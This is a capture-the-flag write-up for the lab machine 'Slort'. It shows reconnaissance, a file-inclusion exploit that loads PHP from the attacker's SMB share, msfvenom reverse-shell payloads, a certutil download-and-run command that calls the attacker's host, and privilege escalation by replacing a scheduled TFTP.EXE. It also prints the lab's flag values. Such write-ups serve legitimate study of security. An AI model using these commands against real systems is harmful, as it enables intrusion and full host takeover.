# CTF Writeup: Slort

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.210.53
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 11:31 EST
Nmap scan report for 192.168.210.53
Host is up (0.023s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.210.53:4443/dashboard/
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.210.53:8080/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-open-proxy: Proxy might be redirecting requests
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/8%OT=21%CT=1%CU=34299%PV=Y%DS=4%DC=T%G=Y%TM=690F711
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=I%CI=I%TS=U)SEQ(SP=1
OS:03%GCD=1%ISR=10C%TI=I%CI=I%TS=U)SEQ(SP=103%GCD=1%ISR=10D%TI=I%CI=I%TS=U)
OS:SEQ(SP=104%GCD=1%ISR=106%TI=I%CI=I%TS=U)SEQ(SP=F8%GCD=1%ISR=110%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-08T16:34:15
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   21.51 ms 192.168.45.1
2   21.46 ms 192.168.45.254
3   21.51 ms 192.168.251.1
4   21.57 ms 192.168.210.53

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.56 seconds
```

Enumerated endpoints on the webserver running on port 4443 & found /site endpoint.

```
gobuster dir -u http://192.168.210.53:4443/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.210.53:4443/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 403) [Size: 1060]
/img                  (Status: 301) [Size: 345] [--> http://192.168.210.53:4443/img/]
/site                 (Status: 301) [Size: 346] [--> http://192.168.210.53:4443/site/]
/examples             (Status: 503) [Size: 1060]
/licenses             (Status: 403) [Size: 1205]
/dashboard            (Status: 301) [Size: 351] [--> http://192.168.210.53:4443/dashboard/]
/IMG                  (Status: 301) [Size: 345] [--> http://192.168.210.53:4443/IMG/]
/Site                 (Status: 301) [Size: 346] [--> http://192.168.210.53:4443/Site/]
/*checkout*           (Status: 403) [Size: 1046]
/Img                  (Status: 301) [Size: 345] [--> http://192.168.210.53:4443/Img/]
/phpmyadmin           (Status: 403) [Size: 1205]
/webalizer            (Status: 403) [Size: 1046]
/*docroot*            (Status: 403) [Size: 1046]
/*                    (Status: 403) [Size: 1046]
/con                  (Status: 403) [Size: 1046]
/Dashboard            (Status: 301) [Size: 351] [--> http://192.168.210.53:4443/Dashboard/]
/**http%3a            (Status: 403) [Size: 1046]
/*http%3A             (Status: 403) [Size: 1046]
/xampp                (Status: 301) [Size: 347] [--> http://192.168.210.53:4443/xampp/]
/aux                  (Status: 403) [Size: 1046]
```

The webpage /site seems to be vulnerable to LFI

```
http://192.168.210.53:4443/site/index.php?page=../../../Windows/win.ini
```

Let's check if it's vulnerable to RFI aswell

First step is to start up my smbserver, my smbserver is in /srv/smb

```
systemctl start smbd
```

Created an test.php file inside the /srv/smb directory (which acts like an smb share), this should display "Hello, World!".

```
http://192.168.210.53:4443/site/index.php?page=\\192.168.45.166\htb\test.php
```

Indeed, it does! Let's abuse this to get RCE.


Therefore, I created an shell.exe file utilizing msfvenom.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.166 LPORT=1337 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
```

Created an command.php in the /srv/smb share, which requests our shell.exe and downloads it onto the target system.

```
cat command.php                  
<?php system('certutil -urlcache -split -f http://192.168.45.166/shell.exe C:/Windows/Temp/shell.exe'); ?>
```

Downloaded inside C:/Windows/Temp

Let's now create an php file, which executes the payload.


```
cat shellexec.php 
<?php system('C:/Windows/Temp/shell.exe'); ?>
```

Start up our listener on port 1337

```
nc -lvnp 1337
```

Send an request to load our smb share file shellexec.php in order to gain execute the shell.exe in C:/Windows/Temp/shell.exe

```
http://192.168.210.53:4443/site/index.php?page=\\192.168.45.166\htb\shellexec.php
```


Gained RCE as user "rupert".

```
nc -lvnp 1337                              
listening on [any] 1337 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.210.53] 52976
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\site>
```

Retrieved local.txt in C:/Users/rupert/Desktop

```
1224026c9001d68630d4fa89dca5d8c0
```

## Privilege Escalation

Enumerated Windows OS Version

```
C:\Users\rupert\Desktop>systeminfo
systeminfo

Host Name:                 SLORT
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
```

The target seems to be running Windows 10 Pro

Before we exploit that, let's check which Privileges the user "rupert" has.

```
C:\Users\rupert\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Doesn't look exploitable! Let's use Potato Exploit's in order to get system privs.

Unfortunately Potato Exploit's also didn't work here, but I found an interesting Backup directory, in which there were an .exe file, an info.txt file which told me that the .exe get's executed every 5mins and basically saves up backup.txt

I was able to edit the backup.txt
```
icacls backup.txt
```

Decided to move the backup.txt to backup.txt.bak and create my own backup.txt

```
C:\Backup>echo "C:/Temp/rev.exe" > backup.txt
echo "C:/Temp/rev.exe" > backup.txt
```

Uploaded rev.exe which is another windows revshell running on port 8888 onto the system.

Since it gets ran every 5min, let's start our listener on port 8888, once it get's executed we should get SYSTEM RCE.

```
C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```

```
nc -lnvp 8888
```

Unfortunately this didn't seem to work.

I tried to modify the TFTP.EXE and it worked

```
move TFTP.EXE TFTP.EXE.bak
```

Created TFTP.EXE Rev shell payload utilizing msfvenom.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.166 LPORT=8888 -f exe > TFTP.EXE 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
```

Downloaded it onto the Server and put it in the /Backup directory.

After some time I gained system shell.

```
 nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.210.53] 55045
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
slort\administrator
```

Retrieved proof.txt in C:\Users\Administrator\Desktop


```
47217af90506b07b1092f81bc541e8cb
```
